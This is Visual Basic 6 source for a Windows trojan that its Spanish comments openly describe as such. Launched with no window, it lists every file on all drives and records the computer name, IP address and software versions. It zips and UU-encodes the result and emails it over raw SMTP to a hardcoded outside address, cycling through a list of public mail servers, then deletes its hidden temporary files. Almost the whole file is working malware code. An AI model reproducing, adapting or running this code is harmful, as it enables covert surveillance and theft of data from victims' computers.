VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   990
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   1590
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   990
   ScaleWidth      =   1590
   StartUpPosition =   3  'Windows Default
   Begin VB.Timer Timer1 
      Enabled         =   0   'False
      Left            =   840
      Top             =   480
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
'   Troyano desarrollado por <gerard.farras@campus.uab.es> para 
'
'   Funciones:      (1) Escribe en un fichero de texto los nombres del todos los ficheros
'                       del disco duro, diskette, etc..
'                   (2) Comprime dicho fichero
'                   (2) Envía esta información por correo electrónico.
'
'   Plataformas soportadas:
'                               Windows XP          NO      (?)
'                               Windows 2K          OK!
'                               Windows ME          ?
'                               Windows 98          OK!
'                               Windows 95          ?
'                               Windows 3.11        ?
'
'   Requerimientos:   Debido a que este programa utiliza sockets, y
'                     comprime información con zip, el sistema
'                     necesita tener instalado los siguientes archivos:
'
'                       mswinsck.ocx
'                       zip32.dll
'
'                   convenientemente registrados con regsvr32.exe

'
'     Nota: La web, que contiene el código de este ejecutable, ya se encargará
'           de instalar los ficheros anteriores.


Option Explicit

'Definición de varias constantes

        'Datos de envío del correo
        
        'Lista con varios servidores smtp (Para añadir servidores smtp, modificar variables siguientes)
        Const total_servidores = 19
        Dim lista_smtp(total_servidores) As String
        Dim server_actual As Integer
       
       'El emisor del mail será de la forma: resultado.troyano@servidor_smtp.com"
        Const emisor = "resultado.troyano@"
        'Const receptor = "gerard.farras@campus.uab.es"
        'Const receptor = "webmaster@bankhacker.com"
        Const receptor = "jips00@wanadoo.es"
        
        'Esta variable recogerá la respuesta al HELO durante la transacción SMTP.
        'NORMALMENTE responden así: 250 smtp.servidor.com Hello [xx.xx.xx.xx], please to meet you..
        ' Así podemos conseguir la IP del usuario.
        Dim subject As String
                
       ' Constantes para SearchDirs()
        Const vbBackslash = "\"
        Const vbAllFiles = "*.*"
        Const vbKeyDot = 46

        'Ejecucion en modo debug?
        Const mododebug = False
        'Const mododebug = True
                
        
        'Nombre del fichero creado con la lista de los directorios ( y comprimido)
        Const listfiles = "C:\scandisk.txt"
        Const listfileszipped = "C:\scandisk.zip"
        
'Fin definición constantes

'Estado de la transacción del correo
Private Enum SMTP_State
    MAIL_CONNECT
    MAIL_HELO
    MAIL_FROM
    MAIL_RCPTTO
    MAIL_DATA
    MAIL_DOT
    MAIL_QUIT
End Enum

'Definición de varias variables globales
Private m_State As SMTP_State
Dim WFD As WIN32_FIND_DATA, hItem&, hFile&
Dim textfitxer As String

'Descriptor de fichero
Dim scandisk As Integer
Dim fin As Boolean


' La aplicación entera se desarrollará en este evento: Form_Load.
' Así conseguimos que no aparezca ninguna ventana en el ordenador infectado.

Private Sub Form_Load()

            'Llenamos la lista de los servidores smtp
           
           
            lista_smtp(0) = "mailhost.terra.es"
            lista_smtp(1) = "smtp.worldonline.es"
            lista_smtp(2) = "smtp.terra.es"
            lista_smtp(3) = "smtp.telefonica.net"
            lista_smtp(4) = "smtp.supercable.es"
            lista_smtp(5) = "smtp.jazzfree.com"
            lista_smtp(6) = "smtp.adsl.ya.com"
            lista_smtp(7) = "smtp.worldonline.es"
            lista_smtp(8) = "smtp.teleline.es"
            lista_smtp(9) = "lonepeak.vii.com"
            lista_smtp(10) = "smtp.eresmas.com"
            lista_smtp(11) = "aldus.northnet.org"
            lista_smtp(12) = "smtp.wanadoo.es"
            lista_smtp(13) = "smtp.telepolis.com"
            lista_smtp(15) = "correo.bankhacker.com"
            lista_smtp(16) = "correo.masterd.es"
            lista_smtp(17) = "anayet.masterd.es"
            lista_smtp(18) = "195.55.224.99"



                      
            server_actual = 0
            fin = False

                                   
            'Llamamos a la función que recorrerá todas las unidades de nuestra computadora
            '(desde la A: a la Z:)
            
            If mododebug = True Then
                     MsgBox ("Inicio d´escaneo a disco")
            End If
            
            scandisk = FreeFile
            Open listfiles For Output As #scandisk
        
                      
                        
        'Escribe en el fichero creado las primeras linias con información del equipo
            informacion_equipo
                      
            'Inicio de scan en discos....
            start_scan
            
            Close #scandisk
            SetAttr listfiles, vbHidden
                               
            'Esta función comprimirá el fichero especificado
            compress (listfiles)
            SetAttr listfileszipped, vbHidden
                             
            'Borramos el fichero innecesario scandisk.txt
            SetAttr listfiles, vbNormal
            Kill (listfiles)
            
            If mododebug = True Then
                    MsgBox ("Fin escaneo a disco - Iniciamos transacción SMTP")
            End If
                        
            'Iniciamos envio de correo
            Timer1.Enabled = True
            Timer1.Interval = 50000
            Winsock1.Connect lista_smtp(server_actual), 25
                    
            'El siguiente bucle es para que no se aborte el programa
            ' cuando envíe el correo
            Do While Not fin
                DoEvents
            Loop
            
            'Finalizar el programa!
            
            'Cambiamos el atributo de oculto a listfileszipped para borrarlo
            SetAttr listfileszipped, vbNormal
            Kill listfileszipped
            End
End Sub

Private Sub start_scan()

    On Error Resume Next
    
    'Esta función escanea todo el disco duro, y escribe el resultado en un fichero
    ' temporal llamado scandisk.txt

    Dim drvbitmask&, maxpwr%, pwr%
    
      drvbitmask& = GetLogicalDrives()
    'Si GetLogicalDrives() funciona, devolverá una máscara de bits representando
    'las unidades actualmente disponibles. El Bit de la posición 0 (bit menos
    'significante), será la unidad A, el bit de la posición 1 la B, ...
    'Si la función falla devolverá un zero.
   
    If drvbitmask& Then
               
        ' Buscamos en cada unidad disponible
        maxpwr% = Int(Log(drvbitmask&) / Log(2))
        For pwr% = 0 To maxpwr%
            If (2 ^ pwr% And drvbitmask&) Then _
                Call SearchDirs(Chr$(vbKeyA + pwr%) & ":\")
        Next
    End If
    
End Sub


' Podemos utilizar los valores devueltos en la estructura WIN32_FIND_DATA
' para obtener la información que queramos para un directorio en particular o un
' grupo de ficheros

' Este procedimiento recursivo es similar al ejemplo de la función Dir$
' del fichero de ayuda de VB3

Private Sub SearchDirs(curpath$)

    ' Estas variables no pueden ser estáticas!! Tienen que modificarse en cada
    ' llamada recursiva
    Dim dirs%, dirbuf$(), i%
    
    ' Este bucle encuentra todos los subdirectorios y ficheros de un directorio en particular
    hItem& = FindFirstFile(curpath$ & vbAllFiles, WFD)
    If hItem& <> INVALID_HANDLE_VALUE Then
        
        Do
            ' Test solamente para directorios
            If (WFD.dwFileAttributes And vbDirectory) Then
                
                ' Chequeamos que no sea un subdirectorio DOS como "." o ".."
                If Asc(WFD.cFileName) <> vbKeyDot Then
                 
                    ' Estamos en el corazón del procedimiento recursivo
                    ' Escribimos los subdirectorios del directorio actual en un array
                    ' y llamaremos a la función. ???
          
                    If (dirs% Mod 10) = 0 Then ReDim Preserve dirbuf$(dirs% + 10)
                        dirs% = dirs% + 1
                        dirbuf$(dirs%) = Left$(WFD.cFileName, InStr(WFD.cFileName, vbNullChar) - 1)
                    End If
   
                End If
        
            
            ' Obtenemos el siguiente subdirectorio o fichero
        Loop While FindNextFile(hItem&, WFD)
        
         Call FindClose(hItem&)
         Call SearchFileSpec(curpath$)
    
    End If
    
    ' Recursivamente llamamos este procedimiento y iteramos a través de cada subdirectorio.
    For i% = 1 To dirs%: SearchDirs curpath$ & dirbuf$(i%) & vbBackslash: Next i%
  
End Sub

Private Sub SearchFileSpec(curpath$)

' Este procedimiento buscará los ficheros del directorio actual
    
    hFile& = FindFirstFile(curpath$ & "*.*", WFD)
    If hFile& <> INVALID_HANDLE_VALUE Then
        
       Do
           textfitxer = curpath$ & Left$(WFD.cFileName, InStr(WFD.cFileName, vbNullChar) - 1)
           Debug.Print textfitxer
           Print #scandisk, textfitxer
           
          'Obtenemos el siguiente fichero
       Loop While FindNextFile(hFile&, WFD)
        
            Call FindClose(hFile&)
    
    End If

End Sub

'Se activa el reloj... será que no podemos iniciar una conexión....
Private Sub Timer1_Timer()

If mododebug = True Then
            MsgBox ("Activado timer: El firewall de " & lista_smtp(server_actual) & " filtrará la petición?")
End If
            'Cerramos la conexión actual y vamos a probar con otro servidor.
            Winsock1.Close
            server_actual = server_actual + 1

 If server_actual <= total_servidores Then
                m_State = MAIL_CONNECT
                Winsock1.Connect lista_smtp(server_actual), 25
 Else
                'No hay más servidores disponibles, el mail NO puede enviarse....
                Winsock1.Close
                fin = True
 End If

End Sub

'Este evento será llamado cada vez que lleguen datos del socket, procedentes
' de la transacción smtp para enviar el correo electrónico
Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)

    Dim strServerResponse   As String
    Dim strResponseCode     As String
    Dim strDataToSend       As String
    
    Dim scadena As String
    Dim scandiskfile As Integer
    
    'Al recibir datos, es que la conexión ya está establecida..
    Timer1.Enabled = False
        
   'Recibimos datos del buffer de winsock1
    Winsock1.GetData strServerResponse
    Debug.Print strServerResponse
    
   'Si strServerResponse es la respuesta al HELO.
   '. obtenemos la IP externa de la víctima!
   If m_State = MAIL_HELO Then
            subject = strServerResponse
    End If
   
    'Obtenemos la respuesta del servidor (los tres primeros símbolos)
    strResponseCode = Left(strServerResponse, 3)
    
    'Solamente los tres códigos siguientes nos muestran que la negociación SMTP funciona
    'correctamente
    If strResponseCode = "250" Or _
       strResponseCode = "220" Or _
       strResponseCode = "354" Then
       
        Select Case m_State
            Case MAIL_CONNECT
                'Cambiamos el estado de la transacción
                m_State = MAIL_HELO
              
                'Enviamos el comando HELO
                'Winsock1.SendData "HELO " & Mid(smtpserver, InStr(1, smtpserver, ".", vbTextCompare) + 1, Len(smtpserver)) & vbCrLf
                'Debug.Print "HELO " & Mid(smtpserver, InStr(1, smtpserver, ".", vbTextCompare) + 1, Len(smtpserver)) & vbCrLf
                
                Winsock1.SendData "HELO " & Mid(lista_smtp(server_actual), InStr(1, lista_smtp(server_actual), ".", vbTextCompare) + 1, Len(lista_smtp(server_actual))) & vbCrLf
                Debug.Print "HELO " & Mid(lista_smtp(server_actual), InStr(1, lista_smtp(server_actual), ".", vbTextCompare) + 1, Len(lista_smtp(server_actual))) & vbCrLf
                
                             
            Case MAIL_HELO
               'Cambiamos el estado de la transacción
                m_State = MAIL_FROM
                             
               'Enviamos el comando MAIL FROM
                Winsock1.SendData "MAIL FROM: " & emisor & Mid(lista_smtp(server_actual), InStr(1, lista_smtp(server_actual), ".", vbTextCompare) + 1, Len(lista_smtp(server_actual))) & vbCrLf
                Debug.Print "MAIL FROM: " & emisor & Mid(lista_smtp(server_actual), InStr(1, lista_smtp(server_actual), ".", vbTextCompare) + 1, Len(lista_smtp(server_actual))) & vbCrLf
                              
            Case MAIL_FROM
               'Cambiamos el estado de la transacción
                m_State = MAIL_RCPTTO
              
                'Enviamos el comando RCPT TO
                Winsock1.SendData "RCPT TO: " & receptor & vbCrLf
                Debug.Print "RCPT TO: " & receptor & vbCrLf
                
            Case MAIL_RCPTTO
                'Cambiamos el estado de la transacción
                m_State = MAIL_DATA
              
                'Enviamos el comando DATA
                Winsock1.SendData "DATA" & vbCrLf
                Debug.Print "DATA" & vbCrLf
           
            Case MAIL_DATA
               'Cambiamos el estado de la transacción
                m_State = MAIL_DOT
              
                'Escribimos Subject
                Winsock1.SendData "From:" & emisor & Mid(lista_smtp(server_actual), InStr(1, lista_smtp(server_actual), ".", vbTextCompare) + 1, Len(lista_smtp(server_actual))) & " <" & emisor & Mid(lista_smtp(server_actual), InStr(1, lista_smtp(server_actual), ".", vbTextCompare) + 1, Len(lista_smtp(server_actual))) & ">" & vbCrLf
                Winsock1.SendData "To:" & receptor & " <" & receptor & ">" & vbCrLf
                Winsock1.SendData "Subject: " & subject & vbCrLf & vbCrLf
               
                Winsock1.SendData "Leer fichero adjunto.." & vbCrLf & vbCrLf
                
                'Esta función, codifica el archivo, y lo va enviando
                UUEncodeFile (listfileszipped)
                                                            
                'Enviamos el símbolo punto para advertir el fin del mensaje
                Winsock1.SendData "." & vbCrLf
                Debug.Print "." & vbCrLf
             
            Case MAIL_DOT
                'Cambiamos el estado de la transacción
                m_State = MAIL_QUIT
           
                'Enviamos el comando QUIT al servidor
                Winsock1.SendData "QUIT" & vbCrLf
                Debug.Print "QUIT" & vbCrLf
                
            Case MAIL_QUIT
               'Cerramos la conexión
                Winsock1.Close
               
        End Select
       
    Else
        
        'Si el servidor responde con un código de error...
        If Not m_State = MAIL_QUIT Then
        
                        'Vamos a probar con el siguiente servidor de la lista...
                        server_actual = server_actual + 1
                        If mododebug = True Then
                                MsgBox "SMTP Error: " & strServerResponse & ".Siguiente servidor: " & lista_smtp(server_actual)
                        End If
                        If server_actual <= total_servidores Then
                                    m_State = MAIL_CONNECT
                                    Winsock1.Close
                                    Timer1.Enabled = True
                                    Winsock1.Connect lista_smtp(server_actual), 25
                        Else
                                    Winsock1.Close
                                    fin = True
                        End If
                        
        Else
                        'Fantástico! El troyano ha enviado el correo!
                        Winsock1.Close
                        fin = True
      End If
      
    End If
    
End Sub

'Función para obtener el nombre de la computadora
Public Function MyGetComputerName() As String

    Dim sComputerName As String
    Dim lComputerNameLen As Long
    
    Dim lResult As Long
    Dim fRV As Boolean
    
    lComputerNameLen = 256
    sComputerName = Space(lComputerNameLen)
    
   lResult = GetComputerName(sComputerName, lComputerNameLen)
    MyGetComputerName = sComputerName
        
End Function

'Función para obtener la versión de Internet Explorer
Public Function IEVersion() As String

    Dim VersionInfo As DllVersionInfo
    VersionInfo.cbSize = Len(VersionInfo)
    Call DllGetVersion(VersionInfo)
    IEVersion = VersionInfo.dwMajorVersion & "." & VersionInfo.dwMinorVersion & "." & VersionInfo.dwBuildNumber
    
    
    
End Function

'Esta función sirve para adjuntar el fichero en el correo
Public Function UUEncodeFile(strFilePath As String)

    Dim intFile         As Integer      'file handler
    Dim intTempFile     As Integer      'temp file
    Dim lFileSize       As Long         'size of the file
    Dim strFilename     As String       'name of the file
    Dim strFileData     As String       'file data chunk
    Dim lEncodedLines   As Long         'number of encoded lines
    Dim strTempLine     As String       'temporary string
    Dim i               As Long         'loop counter
    Dim j               As Integer      'loop counter
    
    Dim strResult       As String
  
    'Obtener el nombre del fichero
    strFilename = Mid$(strFilePath, InStrRev(strFilePath, "\") + 1)
    '
    'Insertamos la primera marca: "begin 664 ..."
    strResult = "begin 664 " + strFilename + vbCrLf
    Winsock1.SendData strResult
    Debug.Print strResult
    
    strResult = ""
    
    
    '
    'Obtenemos el tamaño del fichero
    lFileSize = FileLen(strFilePath)
    lEncodedLines = lFileSize \ 45 + 1
    '
    'Prepare buffer to retrieve data from
    'the file by 45 symbols chunks
    strFileData = Space(45)
    '
    intFile = FreeFile
    '
    Open strFilePath For Binary As intFile
        For i = 1 To lEncodedLines
            'Read file data by 45-bytes cnunks
            '
            If i = lEncodedLines Then
                'Last line of encoded data often is not
                'equal to 45, therefore we need to change
                'size of the buffer
                strFileData = Space(lFileSize Mod 45)
            End If
            'Retrieve data chunk from file to the buffer
            Get intFile, , strFileData
            'Add first symbol to encoded string that informs
            'about quantity of symbols in encoded string.
            'More often "M" symbol is used.
            strTempLine = Chr(Len(strFileData) + 32)
            '
            If i = lEncodedLines And (Len(strFileData) Mod 3) Then
                'If the last line is processed and length of
                'source data is not a number divisible by 3, add one or two
                'blankspace symbols
                strFileData = strFileData + Space(3 - (Len(strFileData) Mod 3))
            End If
            
            For j = 1 To Len(strFileData) Step 3
                'Breake each 3 (8-bits) bytes to 4 (6-bits) bytes
                '
                '1 byte
                strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j, 1)) \ 4 + 32)
                '2 byte
                strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j, 1)) Mod 4) * 16 _
                               + Asc(Mid(strFileData, j + 1, 1)) \ 16 + 32)
                '3 byte
                strTempLine = strTempLine + Chr((Asc(Mid(strFileData, j + 1, 1)) Mod 16) * 4 _
                               + Asc(Mid(strFileData, j + 2, 1)) \ 64 + 32)
                '4 byte
                strTempLine = strTempLine + Chr(Asc(Mid(strFileData, j + 2, 1)) Mod 64 + 32)
            Next j
            'replace " " with "`"
            strTempLine = Replace(strTempLine, " ", "`")
            'add encoded line to result buffer
            strResult = strTempLine + vbCrLf
            Winsock1.SendData strResult
            Debug.Print strResult
            
            strResult = ""
           'reset line buffer
            strTempLine = ""
        Next i
    Close intFile

    'add the end marker
    strResult = "`" & vbCrLf + "end" + vbCrLf
    Winsock1.SendData (strResult)
    Debug.Print strResult
    
           
End Function

'Función para comprimir el fichero fichero con formato zip mediante zip32.dll
Private Sub compress(fichero As String)

Dim Resultado As Long
Dim intContadorFicheros As Integer

Dim FuncionesZip As ZIPUSERFUNCTIONS
Dim OpcionesZip As ZPOPT
Dim NombresFicherosZip As ZIPnames
    FuncionesZip.DLLComment = DevolverDireccionMemoria(AddressOf FuncionParaProcesarComentarios)
    FuncionesZip.DLLPassword = DevolverDireccionMemoria(AddressOf FuncionParaProcesarPassword)
    FuncionesZip.DLLPrnt = DevolverDireccionMemoria(AddressOf FuncionParaProcesarMensajes)
    FuncionesZip.DLLService = DevolverDireccionMemoria(AddressOf FuncionParaProcesarServicios)
    NombresFicherosZip.s(0) = fichero
    Resultado = ZpInit(FuncionesZip)
    Resultado = ZpSetOptions(OpcionesZip)
    Resultado = ZpArchive(1, listfileszipped, NombresFicherosZip)
    

End Sub


Private Sub informacion_equipo()
 'Escribimos la información siguiente: Fecha-Hora,Nombre Equipo,Dirección IP,
 'versión outlook,version explorer,versión windows.
 
            Print #scandisk, "####### INFORMACIÓN SISTEMA #######"
            
            'Fecha hora
            Dim d As Date
            d = Now
            Print #scandisk, "Fecha-Hora: " & d
                               
            'Nombre equipo
            Print #scandisk, "Nombre Computadora: " & MyGetComputerName
                         
            'Dirección IP
            Print #scandisk, "Dirección IP: " & Winsock1.LocalIP
                      
            'Versión InterNet Explorer
            Print #scandisk, "Versión IE: " & IEVersion
            
            'Versión Outlook.... Como hacerlo?? Es siempre la misma que IExplorer?
            
            'Versión Windows
            Dim VersionWindows As String
            
           
        Select Case OperatingSystem
            Case System_Windows_32: VersionWindows = "Windows 32"
            Case System_Windows_95: VersionWindows = "Windows 95"
            Case System_Windows_98: VersionWindows = "Windows 98"
            Case System_Windows_ME: VersionWindows = "Windows ME"
            Case System_Windows_NT: VersionWindows = "Windows NT"
            Case System_Windows_2K: VersionWindows = "Windows 2K"
            Case System_Windows_XP: VersionWindows = "Windows XP"
        End Select
        
         Print #scandisk, "Versión Windows: " & VersionWindows
         
         'Obtener versión de la máquina virtual de Java
         'Mirar al registro:
         Print #scandisk, "Versión JView: " & QueryRegBase("CLSID\{08B0E5C0-4FCB-11CF-AAA5-00401C608500}\InstalledVersion")
                                  
         Print #scandisk, "####### FIN INFORMACIÓN SISTEMA #######"
End Sub


Public Function OperatingSystem() As Enum_OperatingSystem
    Dim lpVersionInformation As OSVERSIONINFO
    lpVersionInformation.dwOSVersionInfoSize = Len(lpVersionInformation)
    Call GetVersionExA(lpVersionInformation)
    If (lpVersionInformation.dwPlatformId = Platform_Windows_32) Then
        OperatingSystem = System_Windows_32
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_95_98_ME) And (lpVersionInformation.dwMinorVersion = 0) Then
        OperatingSystem = System_Windows_95
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_95_98_ME) And (lpVersionInformation.dwMinorVersion = 10) Then
        OperatingSystem = System_Windows_98
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_95_98_ME) And (lpVersionInformation.dwMinorVersion = 90) Then
        OperatingSystem = System_Windows_ME
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_NT_2K_XP) And (lpVersionInformation.dwMajorVersion < 5) Then
        OperatingSystem = System_Windows_NT
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_NT_2K_XP) And (lpVersionInformation.dwMajorVersion = 5) And (lpVersionInformation.dwMinorVersion = 0) Then
        OperatingSystem = System_Windows_2K
    ElseIf (lpVersionInformation.dwPlatformId = Platform_Windows_NT_2K_XP) And (lpVersionInformation.dwMajorVersion = 5) And (lpVersionInformation.dwMinorVersion = 1) Then
        OperatingSystem = System_Windows_XP
    End If
End Function


'Busca una entrada en el registro
Private Function QueryRegBase(ByVal Entry As String, Optional vKey) As String
    Dim buf As String
    Dim buflen As Long
    Dim hKey As Long
    'Si no se especifica la clave del Registro, usar HKEY_CLASSES_ROOT
    If IsMissing(vKey) Then
        hKey = HKEY_CLASSES_ROOT
    Else
        hKey = CLng(vKey)
    End If

    On Local Error Resume Next
    buf = Space$(300)
    buflen = Len(buf)
    'Buscar la entrada especificada y devolver el valor asignado
    If RegQueryValue(hKey, Entry, buf, buflen) = 0 Then
        If buflen > 1 Then
            'El formato devuelto es ASCIIZ, así que quitar el último caracter
            QueryRegBase = Left$(buf, buflen - 1)
        Else
            QueryRegBase = ""
        End If
    Else
        QueryRegBase = ""
    End If
    'Desactivar la detección de errores
    On Local Error GoTo 0
End Function

